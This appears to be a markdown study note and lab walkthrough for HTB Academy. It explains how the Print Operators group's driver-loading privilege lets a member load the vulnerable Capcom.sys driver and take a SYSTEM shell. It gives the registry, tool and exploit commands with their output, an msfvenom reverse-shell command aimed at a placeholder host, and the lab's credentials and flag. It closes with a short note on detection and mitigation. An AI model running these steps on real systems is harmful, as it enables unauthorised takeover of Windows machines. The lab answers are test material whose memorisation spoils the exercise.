# Print Operators Privilege Escalation

## 🎯 Overview

**Print Operators** group grants **SeLoadDriverPrivilege**, allowing members to load device drivers. This privilege can be exploited to load malicious drivers like **Capcom.sys** for **SYSTEM privilege escalation**.

## 🔑 Key Privileges & Capabilities

```cmd
# Print Operators privileges:
SeLoadDriverPrivilege         # Load and unload device drivers
SeShutdownPrivilege           # Shut down Domain Controller
# Plus: manage printers, log on locally to DC
```

## 🔧 Driver Loading Exploitation

### Privilege Verification
```cmd
# Check privileges (may need UAC bypass first)
whoami /priv

# Expected output:
SeLoadDriverPrivilege         Load and unload device drivers       Disabled
```

### Capcom.sys Driver Attack

#### 1. Registry Configuration
```cmd
# Add driver reference to registry
reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\Tools\Capcom.sys"
reg add HKCU\System\CurrentControlSet\CAPCOM /v Type /t REG_DWORD /d 1

# NT Object Path syntax: \??\ for driver location
```

#### 2. Enable Privilege & Load Driver
```cmd
# Method A: Use EnableSeLoadDriverPrivilege.exe
EnableSeLoadDriverPrivilege.exe

# Expected output:
SeLoadDriverPrivilege            Enabled
NTSTATUS: 00000000, WinError: 0

# Method B: Automated with EoPLoadDriver
EoPLoadDriver.exe System\CurrentControlSet\Capcom c:\Tools\Capcom.sys
```

#### 3. Exploit Driver for SYSTEM
```cmd
# Execute ExploitCapcom.exe
ExploitCapcom.exe

# Expected result:
[*] Capcom.sys exploit
[*] Capcom.sys handle was obtained as 0000000000000070
[*] Shellcode was placed at 0000024822A50008
[+] Shellcode was executed
[+] Token stealing was successful
[+] The SYSTEM shell was launched
```

## 🎯 HTB Academy Lab Solution

### Lab Environment
- **Credentials**: `printsvc:HTB_@cademy_stdnt!`
- **Access Method**: xfreerdp
- **Tools Location**: `C:\Tools\` and `C:\Tools\ExploitCapcom\`
- **Objective**: Escalate to SYSTEM and retrieve flag from Administrator desktop
- **Flag**: `Pr1nt_0p3rat0rs_ftw!`

### Detailed Walkthrough

#### 1. Connect via RDP
```bash
# Connect to target using xfreerdp
xfreerdp /v:TARGET_IP /u:printsvc /p:HTB_@cademy_stdnt!

# Example output:
[16:18:25:879] [4321:4323] [INFO][com.freerdp.core] - freerdp_connect:freerdp_set_last_error_ex resetting error state
[16:18:25:880] [4321:4323] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpdr
```

#### 2. Open Elevated Command Prompt
```cmd
# Right-click Command Prompt → "Run as administrator"
# Supply credentials: printsvc:HTB_@cademy_stdnt! when prompted
```

#### 3. Navigate to Tools and Execute EoPLoadDriver
```cmd
cd C:\Tools
EoPLoadDriver.exe System\CurrentControlSet\Capcom c:\Tools\Capcom.sys

# Expected output:
RegCreateKeyEx failed: 0x0
[+] Enabling SeLoadDriverPrivilege
[+] SeLoadDriverPrivilege Enabled
[+] Loading Driver: \Registry\User\S-1-5-21-454284637-3659702366-2958135535-1103\System\CurrentControlSet\Capcom
NTSTATUS: 00000000, WinError: 0
```

#### 4. Navigate to ExploitCapcom Directory
```cmd
cd ExploitCapcom
ExploitCapcom.exe

# Expected output:
[*] Capcom.sys exploit
[*] Capcom.sys handle was obtained as 0000000000000070
[*] Shellcode was placed at 0000016476420008
[+] Shellcode was executed
[+] Token stealing was successful
[+] The SYSTEM shell was launched
[*] Press any key to exit this program
```

#### 5. Retrieve Flag from SYSTEM Shell
```cmd
type C:\Users\Administrator\Desktop\flag.txt

# Flag: Pr1nt_0p3rat0rs_ftw!
```

## 🔄 Alternative Methods

### Non-GUI Exploitation
```c
// Modify ExploitCapcom.cpp line 292 for reverse shell:
TCHAR CommandLine[] = TEXT("C:\\ProgramData\\revshell.exe");

// Generate reverse shell with msfvenom:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=443 -f exe -o revshell.exe
```

### Automated Approach
```cmd
# Single command with EoPLoadDriver
EoPLoadDriver.exe System\CurrentControlSet\Capcom c:\Tools\Capcom.sys

# Then exploit with ExploitCapcom.exe
```

## 🧹 Cleanup

```cmd
# Remove registry key
reg delete HKCU\System\CurrentControlSet\Capcom

# Confirm deletion:
Permanently delete the registry key? Yes
The operation completed successfully.
```

## ⚠️ Limitations

### Windows Version Restrictions
```cmd
# MITIGATED: Windows 10 Version 1803+
# SeLoadDriverPrivilege no longer exploitable
# Cannot reference HKEY_CURRENT_USER registry keys
```

### Detection Indicators
```cmd
# Monitor for:
- Driver loading events
- Registry modifications under CurrentControlSet
- Capcom.sys driver presence
- Privilege escalation to SYSTEM
```

## 💡 Key Takeaways

1. **Print Operators** group provides **SeLoadDriverPrivilege**
2. **Capcom.sys driver** enables SYSTEM privilege escalation
3. **Registry configuration** required for driver loading
4. **Multiple tools available** for automation
5. **Mitigated** on Windows 10 1803+

---

*Print Operators group exploitation relies on vulnerable driver loading capabilities, effective primarily on legacy Windows systems.* 